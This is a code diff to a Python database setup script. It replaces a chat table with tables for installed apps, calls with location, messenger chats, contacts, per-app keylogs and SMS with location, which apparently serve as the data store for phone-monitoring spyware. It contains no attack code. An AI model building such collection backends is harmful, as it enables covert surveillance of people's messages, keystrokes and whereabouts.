@@ -54,16 +54,7 @@ def test_db_connection():
         with get_db_connection() as conn:
             with conn.cursor() as cur:
                 cur.execute('SELECT 1')
-                # Check if tables exist
-                cur.execute("""
-                    SELECT EXISTS (
-                        SELECT FROM information_schema.tables 
-                        WHERE table_name = 'chats'
-                    )
-                """)
-                chats_exists = cur.fetchone()[0]
-                logger.info(f"Chats table exists: {chats_exists}")
-            logger.info("Database connection test successful!")
+                logger.info("Database connection test successful!")
             return True
     except Exception as e:
         logger.error(f"Database connection test failed: {str(e)}")
@@ -74,42 +65,82 @@ def init_db():
     try:
         with get_db_connection() as conn:
             with conn.cursor() as cur:
-                # Drop existing tables if they exist
+                # Drop existing tables
                 cur.execute("""
-                    DROP TABLE IF EXISTS chats CASCADE;
+                    DROP TABLE IF EXISTS applications, calls, chats, contacts, keylogs, sms CASCADE;
                 """)
                 
-                # Create chats table with correct schema
+                # Create applications table
+                cur.execute("""
+                    CREATE TABLE applications (
+                        application_id SERIAL PRIMARY KEY,
+                        application_name VARCHAR(255) NOT NULL,
+                        package_name VARCHAR(255) UNIQUE NOT NULL,
+                        installed_date TIMESTAMP
+                    )
+                """)
+                
+                # Create calls table
+                cur.execute("""
+                    CREATE TABLE calls (
+                        id SERIAL PRIMARY KEY,
+                        call_type VARCHAR(50),
+                        call_time TIMESTAMP,
+                        from_to VARCHAR(255),
+                        duration VARCHAR(50),
+                        location TEXT
+                    )
+                """)
+                
+                # Create chats table
                 cur.execute("""
                     CREATE TABLE chats (
                         id SERIAL PRIMARY KEY,
-                        sender VARCHAR(255) NOT NULL,
-                        recipient VARCHAR(255) NOT NULL,
-                        text TEXT NOT NULL,
-                        time TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
-                        type VARCHAR(50) DEFAULT 'message',
-                        status VARCHAR(20) DEFAULT 'sent',
-                        messenger VARCHAR(100) DEFAULT 'default',
-                        CONSTRAINT valid_participants CHECK (
-                            sender != recipient AND 
-                            (sender = 'user' OR recipient = 'user')
-                        )
+                        messenger VARCHAR(100),
+                        time TIMESTAMP,
+                        sender VARCHAR(255),
+                        recipient VARCHAR(255),
+                        text TEXT
+                    )
+                """)
+                
+                # Create contacts table
+                cur.execute("""
+                    CREATE TABLE contacts (
+                        id SERIAL PRIMARY KEY,
+                        name VARCHAR(255) UNIQUE NOT NULL,
+                        last_message_time TIMESTAMP
+                    )
+                """)
+                
+                # Create keylogs table
+                cur.execute("""
+                    CREATE TABLE keylogs (
+                        id SERIAL PRIMARY KEY,
+                        application VARCHAR(255),
+                        time TIMESTAMP,
+                        text TEXT
+                    )
+                """)
+                
+                # Create SMS table
+                cur.execute("""
+                    CREATE TABLE sms (
+                        id SERIAL PRIMARY KEY,
+                        from_to VARCHAR(255),
+                        text TEXT,
+                        time TIMESTAMP,
+                        location TEXT
                     )
                 """)
                 
                 # Create indexes for better performance
-                cur.execute("""
-                    CREATE INDEX IF NOT EXISTS idx_chats_sender_recipient 
-                    ON chats(sender, recipient)
-                """)
-                cur.execute("""
-                    CREATE INDEX IF NOT EXISTS idx_chats_time 
-                    ON chats(time DESC)
-                """)
-                cur.execute("""
-                    CREATE INDEX IF NOT EXISTS idx_chats_type 
-                    ON chats(type)
-                """)
+                cur.execute("CREATE INDEX idx_apps_installed_date ON applications(installed_date)")
+                cur.execute("CREATE INDEX idx_calls_time ON calls(call_time)")
+                cur.execute("CREATE INDEX idx_chats_time ON chats(time)")
+                cur.execute("CREATE INDEX idx_contacts_name ON contacts(name)")
+                cur.execute("CREATE INDEX idx_keylogs_time ON keylogs(time)")
+                cur.execute("CREATE INDEX idx_sms_time ON sms(time)")
                 
             logger.info("Database initialized successfully")
     except Exception as e:
